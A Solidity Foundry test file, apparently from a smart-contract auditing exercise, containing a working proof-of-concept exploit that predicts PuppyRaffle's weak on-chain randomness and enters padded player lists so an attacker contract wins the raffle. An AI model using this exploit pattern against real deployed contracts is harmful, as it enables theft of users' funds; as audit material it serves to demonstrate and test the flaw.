// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract BreakRandomnessFunction {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attackRandomness() public {
        uint256 playersLength = puppyRaffle.getPlayersLength();
        uint256 winnerIndex;
        uint256 numberOfPlayersToAdd = playersLength;
        while (true) {
            //used instead of for loop if we dont know how many iterations we need to do
            winnerIndex =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            address(this),
                            block.timestamp,
                            block.difficulty
                        )
                    )
                ) %
                numberOfPlayersToAdd;

            if (winnerIndex == playersLength) break;
            numberOfPlayersToAdd += 1;
        }
        uint256 toLoop = numberOfPlayersToAdd - playersLength;

        address[] memory playersToAdd = new address[](toLoop);
        playersToAdd[0] = address(this);
        for (uint256 i = 1; i < toLoop; ++i) {
            playersToAdd[i] = address(i + 100);
        }

        uint256 valueToSend = 1e18 * toLoop;

        puppyRaffle.enterRaffle{value: valueToSend}(playersToAdd);
        puppyRaffle.selectWinner();
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract PuppyRaffleTest is StdInvariant, Test {
    PuppyRaffle puppyRaffle;
    BreakRandomnessFunction breakRandomnessFunction;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        breakRandomnessFunction = new BreakRandomnessFunction(puppyRaffle);
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testRandomnessAttack() public playersEntered {
        vm.deal(address(breakRandomnessFunction), 1000 ether);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        console.log(
            "Attacker balance before: ",
            address(breakRandomnessFunction).balance
        );
        breakRandomnessFunction.attackRandomness();
        console.log(
            "Attacker balance after: ",
            address(breakRandomnessFunction).balance
        );
        assert(
            puppyRaffle.getPreviousWinner() == address(breakRandomnessFunction)
        );
    }
}
